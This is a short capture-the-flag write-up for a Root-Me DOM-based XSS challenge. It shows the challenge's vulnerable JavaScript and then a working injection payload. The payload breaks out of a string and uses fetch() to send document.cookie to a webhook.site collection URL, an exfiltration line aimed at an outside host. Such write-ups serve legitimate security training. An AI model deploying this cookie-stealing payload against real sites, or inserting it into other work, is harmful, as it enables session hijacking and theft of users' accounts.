## vuln code:

```js
  var random = Math.random() * (99);
    var number = '';
    if(random == number) {
        document.getElementById('state').style.color = 'green';
        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
    }
    else{
        document.getElementById('state').style.color = 'red';
        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
    }
```

## exploite:

```js
?number='+fetch('https://webhook.site/YOUR-SERVER-ID?flag='+document.cookie);//";//
```
<a href=https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction>challenge link</a>
